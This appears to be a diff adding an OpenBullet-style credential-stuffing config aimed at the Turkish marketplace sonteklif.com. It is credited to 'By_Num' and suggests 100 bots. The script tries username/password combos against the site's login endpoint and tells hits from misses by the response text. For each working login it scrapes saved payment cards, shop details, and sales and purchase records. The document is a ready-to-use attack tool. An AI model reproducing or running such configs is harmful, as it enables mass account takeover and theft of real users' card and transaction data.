@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "SonTeklif.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-28T19:17:38.0703125+03:00",
+  "AdditionalInfo": "tamamen bana aittir config",
+  "Author": "By_Num",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Giriş REQUEST POST "https://www.sonteklif.com/guvenli-giris/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.sonteklif.com" 
+  HEADER "referer: https://www.sonteklif.com/guvenli-giris?r=k2" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#doğrulama KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success" 
+  KEYCHAIN Failure OR 
+    KEY "Kullanıcı bilgileri geçersiz, " 
+
+#kayıtlı_kart REQUEST GET "https://www.sonteklif.com/bana-ozel/kayitli-kartlarim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<td>1</td> <td>" " </td> <td><a " -> CAP "kayıtlı kartlar ::" 
+
+#dukkanım REQUEST GET "https://www.sonteklif.com/bana-ozel/dukkanim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "22px;font-size: 14px;\"> <b>" "</b> <a " -> CAP "dükkan::" 
+
+#satış_işlemleri REQUEST GET "https://www.sonteklif.com/bana-ozel/satis-islemleri" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "style=\"color: #474747;font-size: 16px;\">" "<br /><br />" -> CAP "SATIŞ İŞLEMLERİ::" 
+
+#satın_alma_işlemleri REQUEST GET "https://www.sonteklif.com/bana-ozel/satin-alma-islemleri" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"satin_alma\" name=\"" "\"" -> CAP "Satın alma işlemi varmı::" 
+
